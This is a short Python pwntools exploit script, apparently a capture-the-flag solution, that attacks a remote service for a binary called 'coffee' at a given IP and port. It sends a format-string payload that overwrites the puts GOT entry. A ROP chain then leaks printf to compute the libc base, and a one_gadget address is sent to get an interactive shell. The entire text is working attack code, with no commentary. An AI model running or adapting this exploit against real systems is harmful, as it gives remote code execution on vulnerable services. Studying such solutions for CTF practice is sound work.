from pwn import *
#p=process("./coffee")
p=remote('34.146.101.4',30002)
elf = ELF('./coffee')
libc = ELF('libc.so.6')
#raw_input("DEBUG")


got_puts = elf.symbols['got.puts']
pop_r12_r13_r14_r15_ret = 0x40128c
main = 0x4011be
pop_rdi = 0x401293
got_printf = elf.symbols['got.printf']
plt_puts = 0x401030
pop_rsi_r15 = 0x401291


payload = "%4748x%8$hnaaaab"+p64(got_puts)
payload += p64(pop_rdi)
payload += p64(got_printf)
payload += p64(plt_puts)
payload += p64(pop_rsi_r15)
payload += p64(got_puts)
payload += p64(0x0)
payload += p64(main)
p.sendline(payload)

p.recvuntil('ab')
p.recv(3)
printf = u64(p.recv(6)+"\x00"*2)
log.info("Printf: "+hex(printf))
base = printf - libc.symbols['printf']
log.info("Base: "+hex(base))
#0xe6c7e 0xe6c81 0xe6c84 0xe6e73 0xe6e76
one = base + 0xe6c81
log.info("One: "+hex(one))

payload = p64(one)
p.sendline(payload)
p.interactive()